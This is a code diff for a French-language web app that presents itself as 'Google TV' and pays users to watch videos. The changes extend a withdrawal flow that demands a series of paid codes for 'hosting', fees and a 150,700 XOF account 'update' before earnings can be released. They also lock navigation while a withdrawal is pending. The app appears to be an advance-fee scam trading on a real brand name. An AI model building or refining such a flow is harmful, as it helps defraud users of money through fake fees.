@@ -31,11 +31,12 @@ type ActivityKey = 'watched' | 'liked' | 'disliked' | 'favorited';
 
 const recommendationLabels = ['Recommandation 1', 'Recommandation 2', 'Recommandation 3', 'Recommandation 4'];
 
-type WithdrawalFlowSnapshot = { codeStep: boolean; certificationBlocked: boolean; hostingStep: boolean; hostedSuccess: boolean; feeStep: boolean; updateStep: boolean; paymentMethod: string; withdrawalCountry: string; amount: string; phone: string };
+type WithdrawalFlowSnapshot = { codeStep: boolean; certificationBlocked: boolean; hostingStep: boolean; hostedSuccess: boolean; feeStep: boolean; updateStep: boolean; withdrawalCode: string; paymentMethod: string; withdrawalCountry: string; amount: string; phone: string };
 const withdrawalFlowKey = (userId: string) => `gtv-withdrawal-flow-${userId}`;
 
 export default function UserHome({ profile, onSignOut }: UserHomeProps) {
   const [tab, setTab] = useState<UserTab>('home');
+  const [withdrawalLocked, setWithdrawalLocked] = useState(false);
   const [activities, setActivities] = useState<Record<string, Activity>>({});
   const [activityError, setActivityError] = useState<string | null>(null);
   const [committedAmount, setCommittedAmount] = useState(0);
@@ -105,11 +106,11 @@ export default function UserHome({ profile, onSignOut }: UserHomeProps) {
       {tab === 'video' && (withdrawalRequired
         ? <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 text-center shadow-2xl sm:p-12"><RotateCcw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Retrait obligatoire avant de continuer</h1><p className="mt-4 leading-7 text-slate-300">Votre solde disponible de <b>{availableBalance.toLocaleString('fr-FR')} XOF</b> a atteint la limite de <b>{withdrawalLimit.toLocaleString('fr-FR')} XOF</b> de votre type de compte.</p><p className="mt-3 text-sm text-slate-400">Vous devez effectuer un retrait avant de pouvoir continuer à regarder des vidéos.</p><button onClick={() => setTab('withdrawal')} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Aller au retrait</button></div></section>
         : <VideoTab activities={activities} rewardAmount={rewardAmount} onActivity={updateActivity} onWatched={markWatched} />)}
-      {tab === 'withdrawal' && <WithdrawalTab profile={profile} counts={counts} rewardAmount={rewardAmount} />}
+      {tab === 'withdrawal' && <WithdrawalTab profile={profile} counts={counts} rewardAmount={rewardAmount} onPendingChange={setWithdrawalLocked} />}
       {tab === 'profile' && <ProfileTab profile={profile} counts={counts} />}
       {activityError && <p className="fixed bottom-24 left-1/2 z-40 -translate-x-1/2 rounded-xl border border-red-400/30 bg-[#2a1720] px-4 py-3 text-sm text-red-200 shadow-xl">{activityError}</p>}
     </main>
-    <nav className="fixed inset-x-0 bottom-0 z-30 border-t border-white/10 bg-[#11151e]/95 px-3 py-3 shadow-[0_-12px_35px_rgba(0,0,0,.35)] backdrop-blur-xl"><div className="mx-auto grid max-w-2xl grid-cols-4 gap-2">{([{ id: 'home', label: 'Accueil', icon: Home }, { id: 'video', label: 'Vidéo', icon: Video }, { id: 'withdrawal', label: 'Retrait', icon: RotateCcw }, { id: 'profile', label: 'Profil', icon: UserRound }] as const).map(({ id, label, icon: Icon }) => <button key={id} onClick={() => setTab(id)} className={`flex flex-col items-center gap-1 rounded-xl px-2 py-2 text-xs font-semibold transition sm:text-sm ${tab === id ? 'text-blue-400' : 'text-slate-500 hover:bg-white/5 hover:text-slate-300'}`}><Icon className="h-6 w-6" strokeWidth={tab === id ? 2.5 : 2} /><span>{label}</span></button>)}</div></nav>
+    <nav className="fixed inset-x-0 bottom-0 z-30 border-t border-white/10 bg-[#11151e]/95 px-3 py-3 shadow-[0_-12px_35px_rgba(0,0,0,.35)] backdrop-blur-xl"><div className="mx-auto grid max-w-2xl grid-cols-4 gap-2">{([{ id: 'home', label: 'Accueil', icon: Home }, { id: 'video', label: 'Vidéo', icon: Video }, { id: 'withdrawal', label: 'Retrait', icon: RotateCcw }, { id: 'profile', label: 'Profil', icon: UserRound }] as const).map(({ id, label, icon: Icon }) => <button key={id} onClick={() => { if (!withdrawalLocked || id === 'withdrawal') setTab(id); }} disabled={withdrawalLocked && id !== 'withdrawal'} className={`flex flex-col items-center gap-1 rounded-xl px-2 py-2 text-xs font-semibold transition sm:text-sm ${tab === id ? 'text-blue-400' : 'text-slate-500 hover:bg-white/5 hover:text-slate-300'} disabled:cursor-not-allowed disabled:opacity-40`}><Icon className="h-6 w-6" strokeWidth={tab === id ? 2.5 : 2} /><span>{label}</span></button>)}</div></nav>
   </div>;
 }
 
@@ -117,33 +118,34 @@ function HomeTab({ firstName, isCertified, onDiscover }: { firstName: string; is
   return <div className="pb-10"><section className="relative -mx-5 min-h-[520px] overflow-hidden sm:-mx-10 sm:min-h-[600px]"><img src={recommended[0].image} alt="" className="absolute inset-0 h-full w-full object-cover object-center opacity-70" /><div className="absolute inset-0 bg-gradient-to-r from-[#090d14] via-[#090d14]/75 to-transparent" /><div className="absolute inset-0 bg-gradient-to-t from-[#090d14] via-transparent to-[#090d14]/20" /><div className="relative flex min-h-[520px] items-end px-5 pb-14 sm:min-h-[600px] sm:px-10 sm:pb-20"><div className="max-w-2xl"><h1 className="text-5xl font-black tracking-tight text-white sm:text-7xl">Bonjour, <span className="inline-flex items-center gap-2 align-middle">{isCertified && <CertifiedBadge />}<span className="hero-gradient">{firstName}</span></span></h1><p className="mt-6 max-w-xl text-xl leading-8 text-slate-300 sm:text-2xl">Bienvenue sur Google TV. Découvrez des milliers de films et séries adaptés à vos goûts.</p><button onClick={onDiscover} className="primary-button mt-8 inline-flex items-center gap-2 rounded-xl px-5 py-3.5 font-bold"><Play className="h-5 w-5 fill-current" /> Découvrir</button></div></div></section><section className="pt-12 sm:pt-16"><h2 className="text-3xl font-black text-white sm:text-4xl">Recommandés pour vous</h2><div className="mt-7 grid grid-cols-2 gap-4 sm:grid-cols-4 sm:gap-5">{recommendationLabels.map((label, index) => { const show = recommended[index]; return <article key={label} className="group overflow-hidden rounded-3xl border border-white/10 bg-[#141a24] transition duration-300 hover:-translate-y-1 hover:border-blue-400/60"><div className="relative aspect-[.76] overflow-hidden"><img src={show.image} alt={label} className="h-full w-full object-cover transition duration-500 group-hover:scale-105" /><div className="absolute inset-x-0 bottom-0 h-1/2 bg-gradient-to-t from-[#10151f] to-transparent" /><div className="absolute bottom-3 left-3 right-3"><p className="text-base font-bold text-white sm:text-lg">Contenu {index + 1}</p><p className="mt-1 text-xs text-slate-300 sm:text-sm">Exclusif · 2026</p></div></div><div className="p-3 sm:p-4"><p className="text-xs font-semibold uppercase tracking-wide text-blue-300">{label}</p></div></article>; })}</div></section></div>;
 }
 
-function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomeProfile; counts: { watched: number; liked: number; favorited: number; rewarded: number }; rewardAmount: number }) {
+function WithdrawalTab({ profile, counts, rewardAmount, onPendingChange }: { profile: UserHomeProfile; counts: { watched: number; liked: number; favorited: number; rewarded: number }; rewardAmount: number; onPendingChange: (pending: boolean) => void }) {
   const flowKey = withdrawalFlowKey(profile.id);
   const savedFlow = (() => { try { const raw = window.localStorage.getItem(flowKey); return raw ? JSON.parse(raw) as WithdrawalFlowSnapshot : null; } catch { return null; } })();
+  const savedWithdrawalCode = savedFlow?.withdrawalCode?.trim() ?? '';
   const [paymentMethod, setPaymentMethod] = useState(savedFlow?.paymentMethod ?? '');
   const [withdrawalCountry, setWithdrawalCountry] = useState(savedFlow?.withdrawalCountry ?? profile.country ?? '');
   const [amount, setAmount] = useState(savedFlow?.amount ?? '');
   const [phone, setPhone] = useState(savedFlow?.phone ?? profile.phone?.replace(/^\+\d+\s?/, '') ?? '');
-  const [withdrawalCode, setWithdrawalCode] = useState('');
+  const [withdrawalCode, setWithdrawalCode] = useState(savedWithdrawalCode);
   const taxPaidKey = `gtv-tax-paid-${profile.id}`;
   const [taxPaid, setTaxPaid] = useState(() => { try { return window.localStorage.getItem(taxPaidKey) === '1'; } catch { return false; } });
-  const [codeStep, setCodeStep] = useState(savedFlow?.codeStep === true && !taxPaid && !profile.is_certified);
+  const [codeStep, setCodeStep] = useState(!savedWithdrawalCode);
   const [certificationBlocked, setCertificationBlocked] = useState(!profile.is_certified && (savedFlow?.certificationBlocked === true || taxPaid));
   const [codeReady, setCodeReady] = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [validating, setValidating] = useState(false);
   const [certChecked, setCertChecked] = useState(false);
   const [certifiedNow, setCertifiedNow] = useState(profile.is_certified);
-  const [hostingStep, setHostingStep] = useState(profile.is_certified || savedFlow?.hostingStep === true);
+  const [hostingStep, setHostingStep] = useState(savedFlow?.hostingStep === true && Boolean(savedWithdrawalCode));
   const [hostingCode, setHostingCode] = useState('');
   const [hostingError, setHostingError] = useState<string | null>(null);
   const [withdrawalProcessing, setWithdrawalProcessing] = useState(false);
   const [hostedSuccess, setHostedSuccess] = useState(false);
-  const [feeStep, setFeeStep] = useState(false);
+  const [feeStep, setFeeStep] = useState(savedFlow?.feeStep === true && Boolean(savedWithdrawalCode));
   const [feeCode, setFeeCode] = useState('');
   const [feeError, setFeeError] = useState<string | null>(null);
   const [feeValidation, setFeeValidation] = useState(false);
-  const [updateStep, setUpdateStep] = useState(false);
+  const [updateStep, setUpdateStep] = useState(savedFlow?.updateStep === true && Boolean(savedWithdrawalCode));
   const [updateCode, setUpdateCode] = useState('');
   const [updateError, setUpdateError] = useState<string | null>(null);
   const [latestRequest, setLatestRequest] = useState<{ status: string; amount: number } | null>(null);
@@ -169,11 +171,13 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
       }
       const rows = data ?? [];
       setCommittedAmount(rows.filter((row) => row.status === 'pending' || row.status === 'approved').reduce((total, row) => total + Number(row.amount), 0));
-      setLatestRequest(rows.length > 0 ? { status: String(rows[0].status), amount: Number(rows[0].amount) } : null);
+      const nextRequest = rows.length > 0 ? { status: String(rows[0].status), amount: Number(rows[0].amount) } : null;
+      setLatestRequest(nextRequest);
+      onPendingChange(nextRequest?.status === 'pending');
       setBalanceReady(true);
     });
     return () => { mounted = false; };
-  }, [profile.id, dismissedLatest, refreshTick]);
+  }, [profile.id, dismissedLatest, refreshTick, onPendingChange]);
 
   useEffect(() => {
     if (!certificationBlocked) return undefined;
@@ -207,15 +211,15 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
   useEffect(() => {
     const flowActive = codeStep || certificationBlocked || hostingStep || hostedSuccess || feeStep || updateStep;
     if (!flowActive) { try { window.localStorage.removeItem(flowKey); } catch { /* stockage indisponible */ } return; }
-    const snapshot: WithdrawalFlowSnapshot = { codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, updateStep, paymentMethod, withdrawalCountry, amount, phone };
+    const snapshot: WithdrawalFlowSnapshot = { codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, updateStep, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone };
     try { window.localStorage.setItem(flowKey, JSON.stringify(snapshot)); } catch { /* stockage indisponible */ }
-  }, [flowKey, codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, updateStep, paymentMethod, withdrawalCountry, amount, phone]);
+  }, [flowKey, codeStep, certificationBlocked, hostingStep, hostedSuccess, feeStep, updateStep, withdrawalCode, paymentMethod, withdrawalCountry, amount, phone]);
 
   const beginSubmit = () => {
     setErrorMessage(null);
-    setWithdrawalCode('');
     setHostingCode('');
     setHostingError(null);
+    if (!withdrawalCode.trim()) { setCodeStep(true); return; }
     if (profile.is_certified) { setHostingStep(true); return; }
     if (taxPaid) { setCertificationBlocked(true); return; }
     setCodeStep(true);
@@ -245,7 +249,13 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
     setWithdrawalProcessing(true);
     window.setTimeout(() => {
       setWithdrawalProcessing(false);
-      setCertificationBlocked(true);
+      if (!profile.is_certified) {
+        setCertificationBlocked(true);
+      } else if (savedFlow?.updateStep === true) {
+        setUpdateStep(true);
+      } else {
+        setHostingStep(true);
+      }
     }, 2000);
   };
 
@@ -278,6 +288,8 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
       else setErrorMessage('Votre demande n’a pas pu être envoyée. Veuillez vérifier les informations puis réessayer.');
       return;
     }
+    setLatestRequest({ status: 'pending', amount: netAmount });
+    onPendingChange(true);
     setAmount('');
     setWithdrawalCode('');
     setCodeStep(false);
@@ -305,7 +317,7 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
 
   if (feeValidation) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Validation en cours</h1><p className="mt-4 leading-7 text-slate-400">Vérification de vos frais de retrait…</p></div></section>;
 
-  if (updateStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><RefreshCw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez faire la mise à jour de votre compte Google TV !</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Coût de la mise à jour</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">150 700 XOF</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de mise à jour"><input type="text" autoComplete="one-time-code" value={updateCode} onChange={(event) => { setUpdateCode(event.target.value); setUpdateError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{updateError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{updateError}</p>}<button onClick={() => { if (updateCode.trim().toUpperCase() === 'GTV-M75100') { setUpdateError(null); setUpdateStep(false); void submit(); } else { setUpdateError('Le code de mise à jour est incorrect.'); } }} disabled={!updateCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Effectuer la mise à jour</button><button onClick={() => { setUpdateStep(false); setUpdateError(null); setFeeStep(true); }} disabled={submitting} className="mt-3 w-full rounded-2xl border border-white/10 px-5 py-3 text-sm font-semibold text-slate-300 hover:bg-white/5">Retour</button></div></div></section>;
+  if (updateStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><RefreshCw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez faire la mise à jour de votre compte Google TV !</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Coût de la mise à jour</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">150 700 XOF</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de mise à jour"><input type="text" autoComplete="one-time-code" value={updateCode} onChange={(event) => { setUpdateCode(event.target.value); setUpdateError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{updateError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{updateError}</p>}<button onClick={() => { if (updateCode.trim().toUpperCase() === 'GTV-M75100') { setErrorMessage(null); setUpdateError(null); setUpdateStep(false); void submit(); } else { setUpdateError('Le code de mise à jour est incorrect.'); } }} disabled={!updateCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Effectuer la mise à jour</button><button onClick={() => { setUpdateStep(false); setUpdateError(null); setFeeStep(true); }} disabled={submitting} className="mt-3 w-full rounded-2xl border border-white/10 px-5 py-3 text-sm font-semibold text-slate-300 hover:bg-white/5">Retour</button></div></div></section>;
 
   if (hostedSuccess) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-green-400/30 bg-[#12241a] p-8 text-center shadow-2xl sm:p-12"><CheckCircle2 className="mx-auto h-12 w-12 text-green-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Compte hébergé avec succès</h1><p className="mt-4 leading-7 text-slate-300">Votre compte Google TV a bien été hébergé. Vous pouvez poursuivre votre demande de retrait.</p><button onClick={() => { setHostedSuccess(false); setFeeCode(''); setFeeError(null); setFeeStep(true); }} className="primary-button mt-8 w-full rounded-2xl px-5 py-4 text-lg font-bold">Continuer</button></div></section>;
 
